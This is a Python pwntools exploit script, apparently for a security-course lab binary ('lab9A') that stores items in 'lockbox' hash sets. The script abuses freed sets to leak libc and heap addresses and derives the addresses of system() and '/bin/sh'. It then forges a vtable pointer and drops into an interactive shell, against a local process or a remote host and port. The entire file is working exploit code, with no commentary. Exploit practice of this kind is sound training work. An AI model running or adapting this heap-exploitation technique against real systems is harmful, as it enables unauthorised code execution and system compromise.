from pwn import *
import sys

def add_new_set(index, elements):
    r.sendline('1')
    r.recvuntil('Which lockbox do you want?: ')
    r.sendline(str(index))
    r.recvuntil('How many items will you store?: ')
    r.sendline(str(elements))
    r.recvuntil('Enter choice: ')

def del_hash_set(index):
    r.sendline('4')
    r.recvuntil('Which set?: ')
    r.sendline(str(index))
    r.recvuntil('Enter choice: ')

def get_item(index, element):
    r.sendline('3')
    r.recvuntil('Which lockbox?: ')
    r.sendline(str(index))
    r.recvuntil('Item value: ')
    r.sendline(str(element))
    r.recvuntil('= ', timeout=.5)
    leak = r.recvline(timeout=.5).strip()
    r.recvuntil('Enter choice: ', timeout=.5)
    return leak

def add_item(index, data):
    r.sendline('2')
    r.recvuntil('Which lockbox?: ')
    r.sendline(str(index))
    r.recvuntil('Item value: ')
    r.sendline(data)
    r.recvuntil('Enter choice: ')

def exploit(r):
    r.recvuntil('Enter choice: ')
    add_new_set(0, 256)
    add_new_set(1, 256)
    add_new_set(2, 256)
    del_hash_set(1)
    del_hash_set(2)
    del_hash_set(0)
    add_new_set(0, 128)
    leak_libc = int(get_item(0, 0)) & 0xffffffff
    log.info("leak_libc: " + hex(leak_libc))

    add_new_set(3, 600)
    leak_heap = int(get_item(3, 389)) & 0xffffffff
    log.info("leak_heap: " + hex(leak_heap))

    leak_system = leak_libc - 0x16a2bf
    log.info("system magic: " + hex(leak_system))

    del_hash_set(3)

    add_item(0, str(leak_system))

    vtable_zero = leak_heap - 0x7fc - 4 - 4 -4
    log.info("Vtable addr: " + hex(vtable_zero))
    for i in range(123, 0x10000):
        if vtable_zero % i == 122:
            log.info('Using size ' + str(i))
            add_new_set(3, i)
            add_item(3, str(vtable_zero))
            break

    bin_sh = leak_system + 0x120893
    pause()
    get_item(1, str(bin_sh))

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/levels/lab09/lab9A'])
        log.info(util.proc.pidof(r))
        pause()
        exploit(r)
